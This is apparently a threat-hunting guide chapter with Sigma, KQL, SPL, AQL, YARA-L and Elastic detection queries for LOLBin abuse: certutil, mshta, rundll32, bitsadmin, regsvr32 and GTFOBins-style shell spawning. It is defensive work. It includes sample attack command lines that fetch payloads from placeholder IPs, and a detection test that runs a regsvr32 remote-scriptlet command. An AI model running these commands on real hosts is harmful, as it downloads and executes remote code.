---
title: "LOLBins & Living-off-the-Land Execution"
part: 9
author: "author-agent"
reviewer: "technical-reviewer-agent"
status: "reviewed"
last_validated: "2026-09-16"
depends_on: []
---

# Part 9 — LOLBins & Living-off-the-Land Execution

## Why this part exists

This part covers LOLBAS/GTFOBins-class binary abuse: legitimate, vendor-signed (Windows) or distro-packaged (Linux) executables repurposed for execution, download, or defense evasion without ever introducing a custom malicious binary to the host. It carries six patterns, split five Windows / one Linux, tracking the named binaries in this part's scope — `rundll32`, `mshta`, `certutil`, `bitsadmin`, `regsvr32` — plus a Linux analog pattern generalized across the GTFOBins catalog rather than one binary at a time.

This part's boundary against its neighbors: Part 8 owns PowerShell-specific encoded/obfuscated invocations and 4104 script-block hunting even where a LOLBin hands off to `powershell.exe` mid-chain — this part's queries stop at the LOLBin's own invocation and pivot into Part 8 rather than duplicating it. Part 10 owns the macro/WSH/HTA *delivery* chain (a Word document spawning `mshta.exe`); this part owns `mshta.exe`'s own execution primitive independent of how it got invoked. Part 22 owns generic unsigned-binary and process-injection malware signals; this part is scoped specifically to the named, catalog-documented LOLBAS/GTFOBins abuse primitives, not malware presence in general.

## 1. Windows LOLBAS execution, download, and evasion patterns

**[CONCEPT]** A LOLBin's abuse primitive defeats signature- and hash-based detection by construction — the binary is exactly what the vendor shipped, correctly signed, present on every clean install. The only thing separating malicious use from benign use is context: arguments, parent process, and network destination. See DEH Part 11 §3.1–§3.2 for the full grounding; the five patterns below adapt that section's binary table into ready-to-run queries rather than re-deriving the concept.

### QC-09-01 — Certutil used as a downloader or decoder

| Field | Value |
|---|---|
| **Pattern ID** | `QC-09-01` |
| **MITRE** | T1105 (Ingress Tool Transfer), T1140 (Deobfuscate/Decode Files or Information) |
| **Behavior** | `certutil.exe` invoked with a download (`-urlcache`, `-verifyctl`) or decode (`-decode`) primitive against a target that isn't a certificate file. |
| **DEH cross-ref** | DEH Part 11 §3.2 (Windows LOLBAS patterns) |
| **Languages covered** | Sigma, KQL (Sentinel/Defender), SPL, AQL, YARA-L, Elastic (KQL) |

**[HUNTER]** Certutil ships on every Windows host for certificate and PKI management, which is exactly why it's a favorite downloader: nobody blocks it, and EDR vendors are reluctant to flag a signed system binary by name alone. This hunt beats waiting on a standing rule because the primitive-plus-non-cert-extension combination is narrow enough to run ad hoc against a suspected host without first building an exclusion list.

**[QUERY] Sigma** — Sysmon-based process-creation telemetry on Windows.

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```yaml
title: Certutil Download or Decode Primitive Against a Non-Certificate Target
status: experimental
logsource:
  category: process_creation
  product: windows
detection:
  selection_download:
    Image|endswith: '\certutil.exe'
    CommandLine|contains:
      - '-urlcache'
      - '-verifyctl'
  selection_decode:
    Image|endswith: '\certutil.exe'
    CommandLine|contains: '-decode'
  filter_cert_ext:
    CommandLine|contains:
      - '.cer'
      - '.crt'
      - '.pfx'
  condition: (selection_download or selection_decode) and not filter_cert_ext
falsepositives:
  - See [FALSE POSITIVE] below
level: high
```
Plausible expected result: a hit shows `Image` = `certutil.exe`, `CommandLine` like `certutil.exe -urlcache -f http://198.51.100.20/update.txt update.exe`, `ParentImage` typically `cmd.exe` or `powershell.exe`. Interpretation: consistent with certutil repurposed as a downloader or decoder; the non-cert-extension filter narrows this to a plausible abuse case rather than routine PKI operations.

**[QUERY] KQL (Sentinel/Defender)** — `DeviceProcessEvents` (Defender for Endpoint) or Sysmon-backed `SecurityEvent`.

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```kql
DeviceProcessEvents
| where FileName =~ "certutil.exe"
| where ProcessCommandLine has_any ("-urlcache", "-verifyctl", "-decode")
| where not(ProcessCommandLine has_any (".cer", ".crt", ".pfx"))
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
```
Plausible expected result: a small handful of rows per incident, typically one host, `InitiatingProcessFileName` showing the calling script host. Interpretation: same as above — a hit is consistent with, not proof of, download/decode abuse.

**[QUERY] SPL** — Sysmon or EDR process-creation index.

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```spl
index=sysmon OR index=edr EventCode=1
| search Image="*\\certutil.exe"
| search CommandLine="*-urlcache*" OR CommandLine="*-verifyctl*" OR CommandLine="*-decode*"
| search NOT (CommandLine="*.cer*" OR CommandLine="*.crt*" OR CommandLine="*.pfx*")
| table _time, host, User, CommandLine, ParentImage
```
Plausible expected result: same shape as the KQL result, table form. Interpretation: unchanged.

**[QUERY] AQL** — this is AQL, not standard SQL; QRadar's search surface over the normalized Events table.

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```sql
SELECT DATEFORMAT(starttime,'YYYY-MM-dd HH:mm:ss') AS "Time", sourceip, username, UTF8(payload) AS "Command"
FROM events
WHERE LOGSOURCETYPENAME(devicetype) ILIKE '%Sysmon%'
AND UTF8(payload) ILIKE '%certutil.exe%'
AND (UTF8(payload) ILIKE '%-urlcache%' OR UTF8(payload) ILIKE '%-verifyctl%' OR UTF8(payload) ILIKE '%-decode%')
AND UTF8(payload) NOT ILIKE '%.cer%'
AND UTF8(payload) NOT ILIKE '%.crt%'
AND UTF8(payload) NOT ILIKE '%.pfx%'
LAST 24 HOURS
```
Plausible expected result: rows keyed on raw payload text rather than parsed fields unless a custom property already extracts `CommandLine`. Interpretation: unchanged; a single-event boolean match is well within AQL's native search surface, no correlation needed.

**[QUERY] YARA-L** — Google SecOps UDM process-launch events.

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```yaral
rule certutil_download_or_decode_primitive {
  meta:
    author = "author-agent"
    description = "certutil.exe used as a downloader or decoder against a non-cert target"
  events:
    $proc.metadata.event_type = "PROCESS_LAUNCH"
    $proc.target.process.file.full_path = /certutil\.exe$/ nocase
    $proc.target.process.command_line = /(-urlcache|-verifyctl|-decode)/ nocase
    not $proc.target.process.command_line = /\.(cer|crt|pfx)/ nocase
  condition:
    $proc
}
```
Plausible expected result: a single UDM `PROCESS_LAUNCH` event per hit. Interpretation: unchanged.

**[QUERY] Elastic (KQL)** — a single-event boolean match, so Elastic's own KQL surface (not Sentinel/Defender KQL) is the cheapest fit per DEH Appendix A5 §8's decision table, over Elastic Defend or Auditbeat process events.

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```kql
process.name : "certutil.exe" and process.command_line : ("*-urlcache*" or "*-verifyctl*" or "*-decode*") and not process.command_line : ("*.cer*" or "*.crt*" or "*.pfx*")
```
Plausible expected result: matches surfaced in Elastic's Discover/detection-rule view with the same field shape as above. Interpretation: unchanged.

> **Hunter's Note**
> Certutil's two primitives are often chained across two separate process-creation events a few seconds apart on the same host: one `-urlcache` call pulling a base64-blob disguised as an innocuous file, then a `-decode` call against that same file producing the real payload. If this query fires once, pull every other `certutil.exe` invocation from the same host in the surrounding five minutes before deciding it's a one-off.

**[FALSE POSITIVE]** The concrete driver worth naming: some AD CS auto-enrollment and CRL-refresh scripts, and a handful of legacy software-distribution agents, still shell out to `certutil -urlcache` to pre-warm a cache file with a non-certificate extension (`.dat`, `.cab`) as part of legitimate update checks. Scope the exclusion to the specific known automation service account and destination host pattern, not by widening the certificate-extension filter — a wider filter just gives an attacker more extensions to hide behind.

**[PIVOT]** Pull the hash of whatever file `-urlcache` or `-decode` produced (Sysmon Event ID 15 or the equivalent file-create telemetry), and check for a subsequent process creation using that exact file path as its image — that's the next link in the chain, not this query's own logic restated.

### QC-09-02 — Mshta executing remote-hosted HTA content

| Field | Value |
|---|---|
| **Pattern ID** | `QC-09-02` |
| **MITRE** | T1218.005 (System Binary Proxy Execution: Mshta) |
| **Behavior** | `mshta.exe` launched against a remote HTTP(S) URL or an inline VBScript/JScript argument rather than a local `.hta` file. |
| **DEH cross-ref** | DEH Part 11 §3.2 (Windows LOLBAS patterns) |
| **Languages covered** | Sigma, KQL (Sentinel/Defender), SPL, AQL, YARA-L, Elastic (KQL) |

**[HUNTER]** Mshta is a short-lived launcher — by the time an analyst notices, the interesting activity has usually already moved to a child process. Hunting the launch event itself, rather than waiting for a downstream detection on that child, catches the chain at its earliest and most distinctive point: a scripting-host binary with a URL or inline-script argument that no legitimate local `.hta` invocation needs.

**[QUERY] Sigma**

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```yaml
title: Mshta Execution With Remote URL or Inline Script Argument
status: experimental
logsource:
  category: process_creation
  product: windows
detection:
  selection_url:
    Image|endswith: '\mshta.exe'
    CommandLine|contains:
      - 'http://'
      - 'https://'
  selection_inline:
    Image|endswith: '\mshta.exe'
    CommandLine|contains:
      - 'vbscript:'
      - 'javascript:'
  condition: selection_url or selection_inline
falsepositives:
  - See [FALSE POSITIVE] below
level: high
```
Plausible expected result: `CommandLine` like `mshta.exe http://198.51.100.30/a.hta` or `mshta vbscript:CreateObject("Wscript.Shell").Run(...)`. Interpretation: consistent with mshta used as a remote-content execution proxy rather than a local HTA viewer.

**[QUERY] KQL (Sentinel/Defender)**

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```kql
DeviceProcessEvents
| where FileName =~ "mshta.exe"
| where ProcessCommandLine has_any ("http://", "https://", "vbscript:", "javascript:")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessParentFileName
```
Plausible expected result: same shape, plus grandparent lineage via `InitiatingProcessParentFileName` — often `winword.exe` or `outlook.exe` if delivered via Part 10's macro chain. Interpretation: unchanged; the parent lineage is a pivot point, not part of this pattern's own claim.

**[QUERY] SPL**

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```spl
index=sysmon EventCode=1 Image="*\\mshta.exe"
| search CommandLine="*http://*" OR CommandLine="*https://*" OR CommandLine="*vbscript:*" OR CommandLine="*javascript:*"
| table _time, host, User, ParentImage, CommandLine
```
Plausible expected result: unchanged from KQL. Interpretation: unchanged.

**[QUERY] AQL** — this is AQL, not standard SQL.

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```sql
SELECT DATEFORMAT(starttime,'YYYY-MM-dd HH:mm:ss') AS "Time", sourceip, username, UTF8(payload) AS "Command"
FROM events
WHERE UTF8(payload) ILIKE '%mshta.exe%'
AND (UTF8(payload) ILIKE '%http://%' OR UTF8(payload) ILIKE '%https://%' OR UTF8(payload) ILIKE '%vbscript:%' OR UTF8(payload) ILIKE '%javascript:%')
LAST 24 HOURS
```
Plausible expected result: unchanged. Interpretation: unchanged.

**[QUERY] YARA-L**

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```yaral
rule mshta_remote_content_execution {
  meta:
    author = "author-agent"
  events:
    $proc.metadata.event_type = "PROCESS_LAUNCH"
    $proc.target.process.file.full_path = /mshta\.exe$/ nocase
    $proc.target.process.command_line = /(https?:\/\/|vbscript:|javascript:)/ nocase
  condition:
    $proc
}
```
Plausible expected result: unchanged. Interpretation: unchanged.

**[QUERY] Elastic (KQL)** — single-event boolean match, Elastic KQL surface.

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```kql
process.name : "mshta.exe" and process.command_line : ("*http://*" or "*https://*" or "*vbscript:*" or "*javascript:*")
```
Plausible expected result: unchanged. Interpretation: unchanged.

**[FALSE POSITIVE]** The concrete driver: a small number of legacy intranet kiosk and help-desk tools legitimately launch `mshta.exe` against a real `http://` URL on an internal documentation or ticketing server — this query's scheme-anchored match catches that traffic too, since it doesn't distinguish an internal destination from an external one. Scope an exclusion to the known internal documentation-server hostname or IP range rather than dropping the scheme match itself, since that match is what keeps this pattern narrow in the first place.

**[PIVOT]** Pivot to the child process mshta spawns next — commonly `powershell.exe`, `rundll32.exe`, or a process hosting raw shellcode — since mshta itself is usually a short-lived launcher; also check the outbound HTTP(S) destination via a network-connection event correlated on the same process entity ID.

### QC-09-03 — Rundll32 proxy-executing a non-standard or remote DLL

| Field | Value |
|---|---|
| **Pattern ID** | `QC-09-03` |
| **MITRE** | T1218.011 (System Binary Proxy Execution: Rundll32) |
| **Behavior** | `rundll32.exe` invoked against a DLL path outside `System32`/`SysWOW64`, or a UNC/HTTP path as the DLL argument. |
| **DEH cross-ref** | DEH Part 11 §3.2 (Windows LOLBAS patterns) |
| **Languages covered** | Sigma, KQL (Sentinel/Defender), SPL, AQL, YARA-L, Elastic (KQL) |

**[HUNTER]** Rundll32 is designed to run an exported function from any DLL, which makes the binary itself a permanent proxy-execution primitive rather than a fixable bug — the hunt has to key on where the DLL comes from, not the fact that rundll32 ran at all. This is worth hunting ad hoc because a single suspicious path argument is a strong signal that a standing rule tuned for a specific known-bad path list will miss on a first-seen destination.

**[QUERY] Sigma**

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```yaml
title: Rundll32 Proxy Execution From Non-Standard or Remote Path
status: experimental
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\rundll32.exe'
  path_outside_system32:
    CommandLine|re: '(?i)rundll32\.exe(?!.*\\(system32|syswow64)\\)'
  remote_path:
    CommandLine|contains:
      - '\\\\'
      - 'http://'
      - 'https://'
  condition: selection and (path_outside_system32 or remote_path)
falsepositives:
  - See [FALSE POSITIVE] below
level: medium
```
Plausible expected result: `CommandLine` like `rundll32.exe \\198.51.100.40\share\payload.dll,Entry` or a Program Files path outside the system directories. Interpretation: consistent with rundll32 proxy-executing code the OS didn't ship, not confirmation of malicious intent on its own.

**[QUERY] KQL (Sentinel/Defender)**

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```kql
DeviceProcessEvents
| where FileName =~ "rundll32.exe"
| where (not(ProcessCommandLine contains @"\System32\") and not(ProcessCommandLine contains @"\SysWOW64\"))
     or ProcessCommandLine has_any (@"\\", "http://", "https://")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
```
Plausible expected result: unchanged. Interpretation: unchanged.

**[QUERY] SPL**

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```spl
index=sysmon EventCode=1 Image="*\\rundll32.exe"
| eval outside_sys32=if(match(CommandLine, "(?i)\\\\(system32|syswow64)\\\\"), 0, 1)
| eval remote_path=if(match(CommandLine, "(?i)(\\\\\\\\|https?://)"), 1, 0)
| search outside_sys32=1 OR remote_path=1
| table _time, host, User, ParentImage, CommandLine
```
Plausible expected result: unchanged. Interpretation: unchanged.

**[QUERY] AQL** — this is AQL, not standard SQL.

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```sql
SELECT DATEFORMAT(starttime,'YYYY-MM-dd HH:mm:ss') AS "Time", sourceip, username, UTF8(payload) AS "Command"
FROM events
WHERE UTF8(payload) ILIKE '%rundll32.exe%'
AND (
  (UTF8(payload) NOT ILIKE '%system32%' AND UTF8(payload) NOT ILIKE '%syswow64%')
  OR UTF8(payload) ILIKE '%http://%'
  OR UTF8(payload) ILIKE '%\\\\%'
)
LAST 24 HOURS
```
Plausible expected result: unchanged, keyed on raw payload text. Interpretation: unchanged.

**[QUERY] YARA-L**

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```yaral
rule rundll32_nonstandard_or_remote_dll_path {
  meta:
    author = "author-agent"
  events:
    $proc.metadata.event_type = "PROCESS_LAUNCH"
    $proc.target.process.file.full_path = /rundll32\.exe$/ nocase
    (
      not $proc.target.process.command_line = /\\(system32|syswow64)\\/ nocase
      or $proc.target.process.command_line = /(https?:\/\/|\\\\\\\\)/ nocase
    )
  condition:
    $proc
}
```
Plausible expected result: unchanged. Interpretation: unchanged.

**[QUERY] Elastic (KQL)**

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```kql
process.name : "rundll32.exe" and (
  not process.command_line : ("*\\System32\\*" or "*\\SysWOW64\\*")
  or process.command_line : ("*http://*" or "*\\\\*")
)
```
Plausible expected result: unchanged. Interpretation: unchanged.

> **Engineering Reality**
> Some EDR agents truncate the logged command line at a fixed character limit (commonly 1024 or 2048 characters), and a `rundll32.exe` invocation with a long UNC or HTTP path plus export-function argument can exceed that limit, silently dropping the substring this query matches on. Confirm your agent's command-line field length cap before trusting a clean result on a host running that agent.

**[FALSE POSITIVE]** The concrete driver: many legitimate Control Panel applets and third-party settings UIs invoke `rundll32.exe` against a DLL under `Program Files` rather than `System32` — printer-driver consoles and some antivirus UIs are common examples — which the "outside System32" half of this rule also matches. Fix: allowlist known, signed, first-party vendor DLL directories rather than loosening the system-directory check itself.

**[PIVOT]** Pull the target DLL's on-disk hash and Authenticode signer; a UNC or HTTP path argument is a stronger signal than an unsigned local DLL, so also check the module-load telemetry (Sysmon Event ID 7) for that library, and check whether rundll32's own parent is a scripting host that ties this into `QC-09-02` or Part 10's macro-delivery patterns.

### QC-09-04 — Bitsadmin transferring a payload via a BITS job

| Field | Value |
|---|---|
| **Pattern ID** | `QC-09-04` |
| **MITRE** | T1197 (BITS Jobs) |
| **Behavior** | `bitsadmin.exe /transfer` downloading from a remote HTTP(S) source to a user-writable local destination. |
| **DEH cross-ref** | DEH Part 11 §3.2 (Windows LOLBAS patterns) |
| **Languages covered** | Sigma, KQL (Sentinel/Defender), SPL, AQL, YARA-L, Elastic (KQL) |

**[HUNTER]** BITS jobs survive reboots and throttle themselves to blend into normal network traffic, which is exactly why attackers use `bitsadmin.exe` to download a second-stage payload instead of a plain HTTP request from a script host. Hunting the command-line invocation directly is worthwhile because BITS job state itself (visible via `bitsadmin /list`) is easy to miss if you only check after the transfer has already completed and the job cleaned itself up.

**[QUERY] Sigma**

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```yaml
title: Bitsadmin Transfer Job to a User-Writable Directory
status: experimental
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\bitsadmin.exe'
    CommandLine|contains: '/transfer'
  remote_source:
    CommandLine|contains:
      - 'http://'
      - 'https://'
  writable_dest:
    CommandLine|contains:
      - '\Users\Public\'
      - '\Temp\'
      - '\AppData\'
  condition: selection and remote_source and writable_dest
falsepositives:
  - See [FALSE POSITIVE] below
level: high
```
Plausible expected result: `CommandLine` like `bitsadmin /transfer job1 /download /priority normal http://198.51.100.50/a.exe C:\Users\Public\a.exe`. Interpretation: consistent with BITS used as a stealthy downloader; the writable-destination filter narrows out most signed installer traffic.

**[QUERY] KQL (Sentinel/Defender)**

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```kql
DeviceProcessEvents
| where FileName =~ "bitsadmin.exe"
| where ProcessCommandLine has "/transfer"
| where ProcessCommandLine has_any ("http://", "https://")
| where ProcessCommandLine has_any (@"\Users\Public\", @"\Temp\", @"\AppData\")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
```
Plausible expected result: unchanged. Interpretation: unchanged.

**[QUERY] SPL**

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```spl
index=sysmon EventCode=1 Image="*\\bitsadmin.exe" CommandLine="*/transfer*"
| search (CommandLine="*http://*" OR CommandLine="*https://*")
| search (CommandLine="*\\Users\\Public\\*" OR CommandLine="*\\Temp\\*" OR CommandLine="*\\AppData\\*")
| table _time, host, User, CommandLine
```
Plausible expected result: unchanged. Interpretation: unchanged.

**[QUERY] AQL** — this is AQL, not standard SQL.

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```sql
SELECT DATEFORMAT(starttime,'YYYY-MM-dd HH:mm:ss') AS "Time", sourceip, username, UTF8(payload) AS "Command"
FROM events
WHERE UTF8(payload) ILIKE '%bitsadmin.exe%' AND UTF8(payload) ILIKE '%/transfer%'
AND (UTF8(payload) ILIKE '%http://%' OR UTF8(payload) ILIKE '%https://%')
AND (UTF8(payload) ILIKE '%\Users\Public\%' OR UTF8(payload) ILIKE '%\Temp\%' OR UTF8(payload) ILIKE '%\AppData\%')
LAST 24 HOURS
```
Plausible expected result: unchanged. Interpretation: unchanged.

**[QUERY] YARA-L**

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```yaral
rule bitsadmin_download_to_writable_path {
  meta:
    author = "author-agent"
  events:
    $proc.metadata.event_type = "PROCESS_LAUNCH"
    $proc.target.process.file.full_path = /bitsadmin\.exe$/ nocase
    $proc.target.process.command_line = /\/transfer/ nocase
    $proc.target.process.command_line = /https?:\/\// nocase
    $proc.target.process.command_line = /\\(Users\\Public|Temp|AppData)\\/ nocase
  condition:
    $proc
}
```
Plausible expected result: unchanged. Interpretation: unchanged.

**[QUERY] Elastic (KQL)**

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```kql
process.name : "bitsadmin.exe" and process.command_line : "*/transfer*" and process.command_line : ("*http://*" or "*https://*") and process.command_line : ("*\\Users\\Public\\*" or "*\\Temp\\*" or "*\\AppData\\*")
```
Plausible expected result: unchanged. Interpretation: unchanged.

> **Engineering Reality**
> Microsoft has marked `bitsadmin.exe` deprecated since Windows 10 and it is fully absent from some current Windows 11 builds — Microsoft's own guidance points callers at the `Start-BitsTransfer` PowerShell cmdlet instead. An empty result set for this pattern on a fleet running recent builds may mean the binary is gone, not that BITS abuse isn't happening; cross-check Part 8's PowerShell cmdlet coverage before trusting a clean bitsadmin-only result as a clean host.

**[FALSE POSITIVE]** The concrete driver: some OEM driver-update and patch-management agents still call `bitsadmin.exe` under the hood rather than the newer cmdlet, downloading to a vendor cache path that can sit under `AppData`. False positives cluster tightly on the specific patch-agent service account and host inventory. Fix: allowlist that service account and host set explicitly rather than excluding the writable-directory condition altogether.

**[PIVOT]** Check the same job name (`/transfer <jobname>`) for a later `/complete` or `/resume` call to confirm the transfer finished, pull a hash for whatever landed at the destination path, and check whether that exact path was executed as a child process shortly after.

### QC-09-05 — Regsvr32 remote scriptlet execution ("Squiblydoo")

| Field | Value |
|---|---|
| **Pattern ID** | `QC-09-05` |
| **MITRE** | T1218.010 (System Binary Proxy Execution: Regsvr32) |
| **Behavior** | `regsvr32.exe` registering a remotely hosted COM scriptlet via `/i:http` combined with the silent, no-registration `/s /n /u scrobj.dll` invocation. |
| **DEH cross-ref** | DEH Part 11 §3.2 (Windows LOLBAS patterns) |
| **Languages covered** | Sigma, KQL (Sentinel/Defender), SPL, AQL, YARA-L, Elastic (KQL) |

**[HUNTER]** Squiblydoo is popular specifically because `regsvr32.exe` is a signed Microsoft binary that many application-allowlisting policies exempt by default, and the technique needs no local file at all — the scriptlet loads directly from the URL. This hunt is worth running ad hoc against a suspected host because the `/i:http` argument is close to a unique fingerprint; almost nothing legitimate combines a remote HTTP source with regsvr32's silent-registration flags.

**[QUERY] Sigma**

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```yaml
title: Regsvr32 Remote Scriptlet Execution
status: experimental
logsource:
  category: process_creation
  product: windows
detection:
  selection_remote:
    Image|endswith: '\regsvr32.exe'
    CommandLine|contains: '/i:http'
  selection_silent_scrobj:
    Image|endswith: '\regsvr32.exe'
    CommandLine|contains:
      - '/s'
      - '/n'
      - '/u'
    CommandLine|contains: 'scrobj.dll'
  condition: selection_remote or selection_silent_scrobj
falsepositives:
  - See [FALSE POSITIVE] below
level: high
```
Plausible expected result: `CommandLine` like `regsvr32 /s /n /u /i:http://198.51.100.60/a.sct scrobj.dll`. Interpretation: consistent with the Squiblydoo remote-scriptlet primitive; the combined variant is a high-confidence signal, the flags-only variant less so on its own.

**[QUERY] KQL (Sentinel/Defender)**

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```kql
DeviceProcessEvents
| where FileName =~ "regsvr32.exe"
| where ProcessCommandLine has "/i:http"
     or (ProcessCommandLine has "scrobj.dll" and ProcessCommandLine has_all ("/s","/n","/u"))
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
```
Plausible expected result: unchanged. Interpretation: unchanged.

**[QUERY] SPL**

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```spl
index=sysmon EventCode=1 Image="*\\regsvr32.exe"
| search CommandLine="*/i:http*" OR (CommandLine="*scrobj.dll*" AND CommandLine="*/s*" AND CommandLine="*/n*" AND CommandLine="*/u*")
| table _time, host, User, ParentImage, CommandLine
```
Plausible expected result: unchanged. Interpretation: unchanged.

**[QUERY] AQL** — this is AQL, not standard SQL.

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```sql
SELECT DATEFORMAT(starttime,'YYYY-MM-dd HH:mm:ss') AS "Time", sourceip, username, UTF8(payload) AS "Command"
FROM events
WHERE UTF8(payload) ILIKE '%regsvr32.exe%'
AND (
  UTF8(payload) ILIKE '%/i:http%'
  OR (UTF8(payload) ILIKE '%scrobj.dll%' AND UTF8(payload) ILIKE '%/s%' AND UTF8(payload) ILIKE '%/n%' AND UTF8(payload) ILIKE '%/u%')
)
LAST 24 HOURS
```
Plausible expected result: unchanged. Interpretation: unchanged.

**[QUERY] YARA-L**

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```yaral
rule regsvr32_squiblydoo_remote_scriptlet {
  meta:
    author = "author-agent"
  events:
    $proc.metadata.event_type = "PROCESS_LAUNCH"
    $proc.target.process.file.full_path = /regsvr32\.exe$/ nocase
    (
      $proc.target.process.command_line = /\/i:https?:\/\// nocase
      or (
        $proc.target.process.command_line = /scrobj\.dll/ nocase
        and $proc.target.process.command_line = /\/s/ nocase
        and $proc.target.process.command_line = /\/n/ nocase
        and $proc.target.process.command_line = /\/u/ nocase
      )
    )
  condition:
    $proc
}
```
Plausible expected result: unchanged. Interpretation: unchanged.

**[QUERY] Elastic (KQL)**

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```kql
process.name : "regsvr32.exe" and (
  process.command_line : "*/i:http*"
  or (process.command_line : "*scrobj.dll*" and process.command_line : "*/s*" and process.command_line : "*/n*" and process.command_line : "*/u*")
)
```
Plausible expected result: unchanged. Interpretation: unchanged.

> **Detection Test**
> **Setup:** Windows test host, Sysmon installed; regsvr32's scriptlet primitive needs no local admin rights.
> **Action:** `regsvr32 /s /n /u /i:http://192.0.2.10/test.sct scrobj.dll`
> **Expected result:** A Sysmon Event ID 1 record for `regsvr32.exe` with `CommandLine` containing `/i:http://192.0.2.10/test.sct` and `scrobj.dll`, plus a Sysmon Event ID 3 network-connection record from the same process ID to `192.0.2.10` on port 80 shortly after.

**[FALSE POSITIVE]** The concrete driver: legitimate COM component re-registration during application repair or reinstall (`regsvr32 /s some.dll`) is common on help-desk-driven repair runs, but almost never combines `/i:` with an `http://` target outside genuine attack tooling — the false-positive volume concentrates on the `/s /n /u scrobj.dll`-only half of the rule when a legacy line-of-business app still ships a scriptlet-based install step. Fix: treat the `/i:http` + `scrobj.dll` combination as the high-confidence variant and route the flags-only match to a lower-severity queue.

**[PIVOT]** Pull the scriptlet content itself from the same network-connection event's destination if a proxy or full-packet capture is available, and check for a follow-on process spawned by `regsvr32.exe` — the scriptlet's own payload typically executes as a child of `regsvr32.exe` or `scrobj.dll`'s host process, not inside `regsvr32.exe` itself.

## 2. Linux GTFOBins-class LOLBin-to-shell lineage

**[CONCEPT]** GTFOBins catalogs the Linux/Unix equivalent of LOLBAS, framed mostly around privilege escalation and shell-breakout primitives rather than remote download specifically — a binary that, if runnable via `sudo` or carrying a SUID bit, can spawn a privileged shell. See DEH Part 11 §3.3 for the full binary table and its own Blind Spot/False Positive Trap coverage; this pattern generalizes that table into one shape rather than repeating it binary by binary.

### QC-09-06 — GTFOBins-class utility spawning or piping into a shell

| Field | Value |
|---|---|
| **Pattern ID** | `QC-09-06` |
| **MITRE** | T1059.004 (Command and Scripting Interpreter: Unix Shell); T1548.001 (Abuse Elevation Control Mechanism: Setuid and Setgid) where a `sudo`/SUID context is involved |
| **Behavior** | A GTFOBins-listed utility (`find`, `awk`, `tar`, `vim`/`less`/`man`, `curl`/`wget`, `systemctl`) directly spawning, or piping output into, an interactive shell. |
| **DEH cross-ref** | DEH Part 11 §3.3 (Linux GTFOBins patterns) |
| **Languages covered** | Sigma, KQL (Sentinel/Defender), SPL, AQL (investigative search only, see note), YARA-L, Elastic (EQL) |

**[HUNTER]** GTFOBins' catalog spans dozens of otherwise mundane utilities, so hunting binary-by-binary doesn't scale. The shape that generalizes across the whole catalog is a shell process whose immediate parent is anything other than another shell, a terminal emulator, `sshd`, or a known service manager — that one shape catches `find`, `awk`, `tar`, and whatever GTFOBins adds next month without a new rule per binary, per DEH Part 11 §3.3's own framing.

**[QUERY] Sigma** — assumes an agent (Sysmon for Linux, or an EDR sensor) that flattens the parent process name onto the child's process-creation event.

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```yaml
title: GTFOBins-Shape LOLBin-to-Shell Parent-Child Lineage
status: experimental
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    ParentImage|endswith:
      - '/find'
      - '/awk'
      - '/gawk'
      - '/tar'
      - '/vim'
      - '/less'
      - '/man'
      - '/systemctl'
    Image|endswith:
      - '/sh'
      - '/bash'
      - '/dash'
  condition: selection
falsepositives:
  - See [FALSE POSITIVE] below
level: high
```
Plausible expected result: `ParentImage` = `/usr/bin/find`, `Image` = `/bin/sh`, `ParentCommandLine` showing a `-exec`/`system()`-shaped invocation. Interpretation: consistent with a GTFOBins-style shell breakout; not distinguishing yet between an attacker and an admin fat-fingering a `find -exec` at a terminal.

